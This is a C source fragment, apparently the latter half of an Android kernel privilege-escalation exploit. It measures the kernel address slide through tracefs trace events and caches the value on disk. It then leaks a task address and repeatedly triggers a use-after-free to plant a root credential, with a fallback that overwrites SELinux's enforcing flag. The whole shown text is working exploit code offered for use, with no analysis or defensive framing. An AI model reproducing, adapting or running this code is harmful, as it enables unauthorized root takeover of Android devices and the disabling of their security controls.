		if (s & (SLIDE_ALIGN - 1)) {
			dprintf(STDOUT_FILENO,
				"[slide] sample %d unaligned %#" PRIx64 " -> reject\n",
				i + 1, s);
			continue;
		}
		dprintf(STDOUT_FILENO, "[slide] sample %d %#" PRIx64 "\n",
			i + 1, s);
		cand[n++] = s;
		/* Two agreeing samples are as trustworthy as three. */
		if (n >= 2 && cand[0] == cand[1])
			break;
	}

	if (!n)
		return 0;

	uint64_t best = 0;
	int best_count = 0;
	for (int i = 0; i < n; i++) {
		int c = 0;
		for (int j = 0; j < n; j++)
			if (cand[j] == cand[i])
				c++;
		if (c > best_count) {
			best_count = c;
			best = cand[i];
		}
	}
	if (n >= 2 && best_count < 2) {
		dprintf(STDOUT_FILENO, "[slide] unstable across %d samples\n", n);
		return 0;
	}
	return best;
}

#define SLIDE_CACHE "/data/local/tmp/.yt-slide"

static void boot_id(char *out, size_t cap)
{
	int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
	ssize_t n;
	memset(out, 0, cap);
	if (fd < 0)
		return;
	n = read(fd, out, cap - 1);
	close(fd);
	if (n <= 0) {
		out[0] = 0;
		return;
	}
	for (size_t i = 0; i < (size_t)n; i++)
		if (out[i] == '\n')
			out[i] = 0;
}

static uint64_t read_slide_cache(void)
{
	char line[128] = { 0 }, boot[64];
	FILE *f;
	uint64_t s;
	boot_id(boot, sizeof(boot));
	f = fopen(SLIDE_CACHE, "r");
	if (!f)
		return 0;
	if (!fgets(line, sizeof(line), f)) {
		fclose(f);
		return 0;
	}
	fclose(f);
	char *sp = strchr(line, ' ');
	if (!sp)
		return 0;
	*sp = 0;
	if (strcmp(line, boot))
		return 0;
	s = strtoull(sp + 1, NULL, 0);
	if (!s || (s & (SLIDE_ALIGN - 1)))
		return 0;
	return s;
}

static void write_slide_cache(uint64_t s)
{
	char boot[64];
	FILE *f;
	if (!s)
		return;
	boot_id(boot, sizeof(boot));
	f = fopen(SLIDE_CACHE, "w");
	if (!f)
		return;
	fprintf(f, "%s %#" PRIx64 "\n", boot, s);
	fclose(f);
	chmod(SLIDE_CACHE, 0666);
}

static long mem_available_kb(void)
{
	char line[128];
	long v = 0;
	FILE *f = fopen("/proc/meminfo", "r");
	if (!f)
		return 0;
	while (fgets(line, sizeof(line), f)) {
		if (!strncmp(line, "MemAvailable:", 13)) {
			v = strtol(line + 13, NULL, 10);
			break;
		}
	}
	fclose(f);
	return v;
}

static int selinux_enforcing(void)
{
	char b = '?';
	int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
	if (fd >= 0) {
		if (read(fd, &b, 1) <= 0)
			b = '?';
		close(fd);
	}
	return b;
}

/* SELinux hides available_events from shell; stat the event file instead. */
static int trace_event_available(const char *name)
{
	char path[256];
	struct stat st;
	snprintf(path, sizeof(path), TRACE "/events/%s/enable", name);
	return stat(path, &st) == 0;
}

/* Read-only environment report; touches nothing that can fault. */
static void preflight(int quick)
{
	struct utsname u;
	long ps = sysconf(_SC_PAGESIZE);
	int cpus = cpu_count();
	long avail = mem_available_kb();
	int event = trigger_cmd("enable_event:kmem:kmem_cache_alloc\n") == 0;
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
	int trig = access(TRIGGER, W_OK) == 0;
	int ksu = access("/system/bin/su", X_OK) == 0;
	uint64_t s = 0;
	/* Quick mode answers "is this kernel shaped right" without paying the
	   trace round-trip; the main path measures and caches the real value. */
	if (!quick) {
		/* The trace reader only drains cpu0, so sampling must be pinned there. */
		pin_cpu(0);
		s = measure_slide();
		if (s)
			write_slide_cache(s);
	}
	int align_ok = s && !(s & (SLIDE_ALIGN - 1));
	uname(&u);
	printf("{\"uname\":\"%s\",\"page_size\":%ld,\"cpus\":%d,"
	       "\"mem_avail_kb\":%ld,\"tracefs\":%d,\"trigger\":%d,"
	       "\"event\":%d,\"selinux_enforce\":\"%c\",\"ksu\":%d,"
	       "\"slide\":\"%#" PRIx64 "\",\"slide_aligned\":%d,"
	       "\"verdict\":\"%s\"}\n",
	       u.release, ps, cpus, avail, event && trig, trig, event,
	       selinux_enforcing(), ksu, s, align_ok,
	       /* Only a wrong kernel shape is fatal; an unreadable slide still
	          leaves the main path's own fail-closed check in place. */
	       (ps != 4096 || !event || !trig)
		       ? "blocked"
		       : (quick || align_ok) ? "ok" : "inconclusive");
}

int main(int argc, char **argv)
{
	struct sigaction action = { .sa_handler = on_alarm };
	if (argc > 1 && !strcmp(argv[1], "--exec-ok"))
		_exit(0);
	for (int i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "--slide") && i + 1 < argc)
			g_slide = strtoull(argv[++i], NULL, 0);
	}
	sigaction(SIGALRM, &action, NULL);
	int check_only = 0, quick = 0;
	for (int i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "--check"))
			check_only = 1;
		else if (!strcmp(argv[i], "--quick"))
			quick = 1;
	}
	if (check_only) {
		preflight(quick);
		return 0;
	}
	dprintf(STDOUT_FILENO, "[slide] %#" PRIx64 "\n", g_slide);
	if (argc > 1 && argv[1][0] != '-')
		g_shift = (unsigned)atoi(argv[1]);
	sigaction(SIGALRM, &action, NULL);
	ipc = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
		   MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (ipc == MAP_FAILED)
		return 1;
	memset(ipc, 0, sizeof(*ipc));
	if (pin_cpu(0))
		return 1;
	if (!g_slide)
		g_slide = read_slide_cache();
	if (!g_slide) {
		g_slide = measure_slide();
		dprintf(STDOUT_FILENO, "[slide] measured %#" PRIx64 "\n", g_slide);
		if (!g_slide) {
			dprintf(STDOUT_FILENO,
				"[slide] measurement did not converge, refusing to run\n");
			return 7;
		}
		write_slide_cache(g_slide);
	} else {
		dprintf(STDOUT_FILENO, "[slide] cached %#" PRIx64 "\n", g_slide);
	}
	g_ctx = calloc(MAX_RINGS, sizeof(*g_ctx));
	if (!g_ctx)
		return 1;
	dprintf(STDOUT_FILENO, "[id] uid=%u euid=%u gid=%u\n",
		getuid(), geteuid(), getgid());
	read_enforce();
	g_nrings = 0;
	if (write_file(TRACE "/buffer_size_kb", "16384\n")) {
		disarm();
		return 1;
	}
	if (leak_task()) {
		dprintf(STDOUT_FILENO, "[task] leak failed\n");
		disarm();
		return 5;
	}
	/* v6: one UAF carries both writes -- the PROF node installs the cred, the
	   VIRT node clears selinux_state->enforcing, the SCHED node is a no-op.
	   The dedicated selinux pass is now only a fallback. */
	g_plant_cred = 1;
	int rooted = 0;
	int cand_n = g_ntasks > 0 ? g_ntasks : 1;
	for (int attempt = 1; attempt <= 12 && !rooted; attempt++) {
		unsigned uid = 1, euid = 1;
		int fixed_uid = -1, fixed_suid = -1;
		/* One candidate per attempt: a wrong g_task then costs a single UAF
		   instead of dragging its two repair passes along with it. */
		if (g_ntasks)
			g_task = g_tasks[(attempt - 1) % g_ntasks];
		dprintf(STDOUT_FILENO, "[cred] attempt %d/12 task=%#" PRIx64 "\n",
			attempt, g_task);
		g_plant_cred = 1;
		if (one_uaf(0))
			continue;
		g_plant_cred = 0;
		dprintf(STDOUT_FILENO, "[cred] installed at %#" PRIx64 "\n", g_cred_kva);
		if (ask_child(&uid, &euid) == 0 && uid == 0 && euid == 0) {
			rooted = 1;
			break;
		}
		/* Still walking candidates: skip the repair passes. */
		if (g_ntasks > 1 && attempt <= cand_n)
			continue;
		for (int i = 0; i < 3 && fixed_uid; i++)
			fixed_uid = one_uaf(g_cred_kva + 8);
		for (int i = 0; i < 3 && fixed_suid; i++)
			fixed_suid = one_uaf(g_cred_kva + 16);
		if (ask_child(&uid, &euid) == 0 && uid == 0 && euid == 0)
			rooted = 1;
		else if (uid == 1 && euid == 1)
			dprintf(STDOUT_FILENO, "[cred] child did not answer\n");
		else
			dprintf(STDOUT_FILENO, "[cred] still uid=%u euid=%u\n", uid, euid);
	}
	if (!rooted) {
		uint64_t sel = slide_addr(SELINUX_LINK) - 7;
		g_plant_cred = 0;
		for (int i = 1; i <= 4 && !rooted; i++) {
			char buf[8] = { 0 };
			int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
			if (fd >= 0) {
				if (read(fd, buf, 1) < 0)
					buf[0] = 0;
				close(fd);
			}
			if (buf[0] == '0')
				break;
			dprintf(STDOUT_FILENO, "[selinux] fallback %d/4 target=%#"
				PRIx64 "\n", i, sel);
			if (!one_uaf(sel))
				read_enforce();
		}
		g_plant_cred = 1;
	}
	if (!rooted) {
		dprintf(STDOUT_FILENO, "[uaf] missed page; holding zombie\n");
		for (;;)
			pause();
	}
	dprintf(STDOUT_FILENO, "[cred] child=%d holding pages\n", g_cred_child_pid);
	for (;;)
		pause();
}
